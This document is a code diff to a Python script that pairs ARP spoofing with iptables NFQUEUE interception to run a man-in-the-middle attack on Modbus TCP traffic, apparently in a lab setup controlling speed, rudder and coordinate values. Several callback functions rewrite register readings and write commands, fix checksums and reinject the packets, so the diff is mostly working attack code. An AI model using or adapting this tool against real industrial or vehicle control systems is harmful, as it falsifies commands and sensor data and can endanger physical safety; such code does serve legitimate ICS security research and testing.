@@ -696,6 +696,310 @@ if __name__ == "__main__":
     scapy_sniffing.stop()
     arp_spoofing.stop()
 
+    if process == "nfq":
+
+        arp_spoofing.start()
+
+        # Configure math
+        config.rm = 0
+
+
+        # The print isn't the problem
+        def print_and_accept(pkt):
+            spkt = IP(pkt.get_payload())
+            mb.print_scannable(spkt)
+            pkt.accept()
+        
+
+        # The mb class isn't the problem
+        def check_and_accept(pkt):
+            spkt = IP(pkt.get_payload())
+            if mb.is_commands(spkt) or mb.is_coord(spkt):
+                print("yup")
+            mb.print_scannable(spkt)
+            pkt.accept()
+        
+        # The alter is the problem?
+        def alter_and_accept(pkt):
+            spkt = IP(pkt.get_payload())
+            # mb.print_scannable(spkt)
+            if mb.is_commands(spkt):
+                mb.set_rudder(spkt, 0)
+            # new_spkt = mb.modify_values(spkt, put_buffer=False)
+            mb.print_scannable(spkt)
+            del spkt[TCP].chksum
+            del spkt[IP].chksum
+            pkt.set_payload(bytes(spkt))
+            pkt.accept()
+
+        # Dropping the original and sending a scapy packet appears to work fine
+        def alter_bytes_and_drop(pkt):
+            spkt = IP(pkt.get_payload())
+            if mb.is_commands(spkt):
+                
+                vals = mb.get_commands(spkt)
+                print(f"Original payload is: {vals}")
+
+                # Change rudder (1) to 0
+                spkt = mb.modify_values(spkt, False)
+                print(f"Altered  payload is: {mb.get_commands(spkt)}")
+
+                pkt.drop()
+                scapy.send(spkt)
+
+                # p2 = list(bytes())
+                # print(f"P2 is {p2}")
+            # mb.print_scannable(spkt)
+            else:
+                pkt.accept()
+
+
+            
+
+        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+
+        nfqueue = NetfilterQueue()
+        nfqueue.bind(1, alter_bytes_and_drop)
+        try:
+            print("try run")
+            nfqueue.run()
+        except KeyboardInterrupt:
+            pass
+        finally:
+
+            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
+            arp_spoofing.stop()
+            nfqueue.unbind()
+
+    if process == "also_nfq":
+        arp_spoofing.start()
+        
+        # Configure math
+        config.rm = 0
+        config.xm = 0
+
+        # Dropping the original ((COMMAND)) and sending a scapy packet appears to work fine
+        def alter_command_and_drop(pkt):
+            spkt = IP(pkt.get_payload())
+            
+            if mb.is_commands(spkt) or mb.is_coord(spkt):
+                # Apply mods
+                spkt = mb.modify_values(spkt, False)
+                mb.print_scannable(spkt)
+                pkt.drop()
+                scapy.send(spkt)
+
+            else:
+                pkt.accept()
+
+
+        # I can't modify/drop/send or set_payload/accept coord packets without breaking connection
+        def alter_both_and_drop(pkt):
+            spkt = IP(pkt.get_payload())
+            if mb.is_commands(spkt):
+
+                # Change rudder (1) to 0
+                # spkt = mb.modify_values(spkt, False)
+
+                mb.print_scannable(spkt)
+                drop = True
+                if drop:
+                    pkt.drop()
+                    scapy.send(spkt)
+                else:
+                    pkt.accept()
+            elif mb.is_coord(spkt):
+                spkt = mb.modify_values(spkt, False)
+                
+                pkt.set_payload(bytes(spkt))
+                mb.print_scannable(spkt)
+                drop = False
+                if drop:
+                    pkt.drop()
+                    scapy.send(spkt)
+                else:
+                    pkt.accept()
+
+                # p2 = list(bytes())
+                # print(f"P2 is {p2}")
+            # mb.print_scannable(spkt)
+            else:
+                pkt.accept()
+
+        def show_all_accept_all(pkt):
+            spkt = IP(pkt.get_payload())
+            
+            if mb.is_coord(spkt):
+                
+                print("\n\nCoord")
+                spkt.show()
+        
+                pkt.accept()
+
+            elif mb.is_commands(spkt):
+                print("\n\nCommands")
+                spkt.show()
+                pkt.accept()
+
+            else:
+                print("\n\nnothing")
+                # spkt.show()
+                pkt.accept()
+
+        # Success seems to depend on how hard I reset the system. this is very stable
+        # Deleting TCP.chksum, IP.chksum, IP.len works
+        def callback(pkt):
+            spkt = IP(pkt.get_payload())
+
+            if spkt.haslayer("Read Holding Registers Response"):
+                mbl = spkt.getlayer(ModbusADUResponse)
+
+                mbl.payload.registerVal[0] = 100
+                mbl.payload.registerVal[1] = 200
+
+            elif spkt.haslayer("Write Single Register"):
+                mbl = spkt.getlayer(ModbusADURequest)
+
+                mbl.payload.registerValue = 90
+
+
+            else:
+                # Any packet we don't care about gets accepted
+                pkt.accept()
+                return
+
+            # The packets we care about get flushed and then accepted
+            del spkt[TCP].chksum
+            del spkt[IP].chksum
+            del spkt[IP].len
+            pkt.set_payload(bytes(spkt))
+
+            pkt.accept()
+
+        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+
+        nfqueue = NetfilterQueue()
+        nfqueue.bind(1, callback)
+        try:
+            print("try run")
+            nfqueue.run()
+        except:
+            pass
+        finally:
+
+            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
+            arp_spoofing.stop()
+            nfqueue.unbind()
+            print("clean")
+   
+    if process == "async_nfq":
+        arp_spoofing.start()
+
+        
+        def callback(pkt):
+            spkt = IP(pkt.get_payload())
+
+            if spkt.haslayer("Read Holding Registers Response"):
+                mbl = spkt.getlayer(ModbusADUResponse)
+                
+                print("Original speed:\t",mbl.payload.registerVal[0])
+                print("Original rudder:\t",mbl.payload.registerVal[1])
+
+
+                mbl.payload.registerVal[0] = 100
+                mbl.payload.registerVal[1] = 200
+
+            elif spkt.haslayer("Write Single Register"):
+                mbl = spkt.getlayer(ModbusADURequest)
+
+                print("Original coord:\t",mbl.payload.registerValue)
+
+                mbl.payload.registerValue = 90
+
+
+            else:
+                # Any packet we don't care about gets accepted
+                pkt.accept()
+                return
+
+            # The packets we care about get flushed and then accepted
+            del spkt[TCP].chksum
+            del spkt[IP].chksum
+            del spkt[IP].len
+            pkt.set_payload(bytes(spkt))
+
+            pkt.accept()
+
+        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+
+        nfqueue = NetfilterQueue()
+        nfqueue.bind(1, callback)
+        try:
+            print("try run")
+            nfqueue.run()
+        except:
+            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
+            arp_spoofing.stop()
+            nfqueue.unbind()
+            print("clean")
+            pass
+        print("I guess it made it past the thing")
+
+    if process == "fd_nfq":
+        import select
+
+        stop_event = threading.Event()
+
+        def start_nfqueue():
+            arp_spoofing.start()
+
+            # IPTables rule
+            os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+
+            nfq = NetfilterQueue()
+            nfq.bind(1, callback)
+
+            qfd = nfq.get_fd()
+            poller = select.poll()
+            poller.register(qfd, select.POLLIN)
+
+            # Pipe for stop signaling
+            stop_r, stop_w = os.pipe()
+            poller.register(stop_r, select.POLLIN)
+
+            print("[*] NFQUEUE + Modbus MITM running...")
+
+            try:
+                while not stop_event.is_set():
+                    events = poller.poll(500)
+                    for fd, _ in events:
+                        if fd == qfd:
+                            nfq.run(False)   # process packets without blocking
+                        elif fd == stop_r:
+                            stop_event.set()
+            finally:
+                print("[*] Cleaning up…")
+                nfq.unbind()
+                os.close(stop_r)
+                os.close(stop_w)
+                os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+                arp_spoofing.stop()
+                print("[*] Clean exit.")
+
+        def stop_nfqueue():
+            stop_event.set()
+
+        t = threading.Thread(target=start_nfqueue, daemon=True)
+        t.start()
+
+        input("Press Enter to stop MITM...\n")
+        stop_nfqueue()
+        arp_spoofing.stop()
+        t.join()
+
+
+def stop_nfqueue():
+    stop_event.set()
     
 def abort_all():
     scapy_sniffing.stop()
